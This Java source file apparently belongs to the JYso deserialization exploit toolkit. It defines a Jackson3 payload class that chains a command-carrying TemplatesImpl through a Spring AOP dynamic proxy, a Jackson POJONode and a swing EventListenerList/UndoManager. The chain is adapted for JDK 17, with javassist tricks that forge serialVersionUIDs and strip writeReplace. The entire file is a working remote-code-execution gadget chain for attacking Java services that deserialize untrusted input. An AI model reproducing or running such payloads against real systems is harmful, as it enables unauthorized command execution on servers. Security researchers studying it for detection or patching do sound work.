package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import com.qi4l.JYso.gadgets.utils.Gadgets;

import javassist.ClassClassPath;

import org.springframework.aop.framework.AdvisedSupport;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisorChainFactory;

import javax.xml.transform.Templates;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.*;

import java.util.Vector;

import static com.qi4l.JYso.gadgets.Config.Config.POOL;
import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;


//Jackson2链的JDK17改造
@Dependencies({"spring-apo:6.2.10"})
@Authors({Authors.JSJCW})
public class Jackson3 implements ObjectPayload<Object> {
    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));

        //<=6.0.23为6115154060221772279
        //>=6.1.0 为273003553246259276
        String sUID = "6115154060221772279";
        CtClass ctDefaultAdvisorChainFactory = insertField(
                "org.springframework.aop.framework.DefaultAdvisorChainFactory",
                "private static final long serialVersionUID = " + sUID + "L;");

        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();
        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object            proxy   = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        return proxy;
    }

    public static Object getEventListenerList(Object obj) throws Exception {
        //>=6.1.0 为-7977902244297240866
        //<=6.0.23为
        CtClass ctEventListenerList = insertField(
                "javax.swing.event.EventListenerList", "private static final long serialVersionUID = -7977902244297240866L;");
        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();

        //>=6.1.0 为-1045223116463488483
        //<=6.0.23为
        CtClass ctUndoManager = insertField(
                "javax.swing.undo.UndoManager", "private static final long serialVersionUID = -1045223116463488483L;");
        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c     = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }

    @Override
    public Object getObject(final String command) throws Exception {
        try {
            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception ignored) {

        }

        //ArrayList<Class> classes = new ArrayList<>();
        //classes.add(TemplatesImpl.class);
        //classes.add(POJONode.class);
        //classes.add(EventListenerList.class);
        //classes.add(Jackson3.class);
        //classes.add(Field.class);
        //classes.add(Method.class);
        //new jdk17Bypass().bypassModule(classes);


        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));

        return getEventListenerList(node);
    }


}
